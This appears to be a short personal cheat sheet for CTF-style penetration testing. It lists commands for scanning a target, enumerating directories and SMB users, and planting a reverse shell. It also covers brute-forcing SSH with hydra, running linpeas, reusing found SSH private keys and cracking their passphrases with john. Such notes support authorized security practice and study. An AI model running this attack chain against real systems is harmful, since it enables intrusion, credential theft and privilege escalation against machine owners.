-> scan vulnerabilities in victim machine
 $ nmap -sS -A <ip>

** if http is open,
-> firstly check for any info in page source to get somenwhere

-> to enumerate for directories/paths in victims server
 $ gobuster -w /usr/share/worldists/dirbuster/directory-list-2.3-medium.txt -u http://<ip>
 
-> if there is any uploads directory, upload the msfvenom's php reverse shell and run it to get command line interface of the victim

** if smb is open (port : 445)
-> to get users listed or presesnt in victims machine
 $ enum4linux -a <ip> 

** if ssh port(22) is open, 
-> bruteforce with username(found from port 445 above) and password wordlists
 $ hydra -l <username-found> -P /usr/share/wordlists/rockyou.txt ssh://<ip>
 (if the rockyou.txt is in .gz format, unzip it using $ gzip -d rockyou.txt.gz)

-> to log in to ssh
 $ ssh <username>@<ip> (enter password when prompted)

** once logged in into ssh
-> to view all the users in the system
 $ cat /etc/passwd

-> search for all home directories of users for info, to find something on root privilege escalation

-> to enumerate on users/victims machine, linpeas(search in github) can be used
 (save linPEAS in any dir in attack machine)
 $ scp /path-to/linpeas.sh <username(victim's machine)>@<ip>:/dev/shm
 (in victims machine's ssh)
 $ cd /dev/shm
 $ chmod +x linpeas.sh
 $./linpeas.sh
 (search for anything in red, ex: locally open ports/private ssh keys)
 
* if you get a ssh private key
 (cd there, copy the key you find)
 $ nano id_rsa
 (paste the key copied)
 $ chmod 600 id_rsa
 $ ssh -i id_rsa <new_user>@<ip>
 (if the id_rsa asks for a passphrase)
 (search for JohnTheRipper or install ir and use ssh2join)
 $ ssh2join.py id_rsa > forjohn.txt
 $ john forjohn.txt --wordlist /usr/share/wordlists/rockyou.txt
 (u get the passphrase for id_rsa)
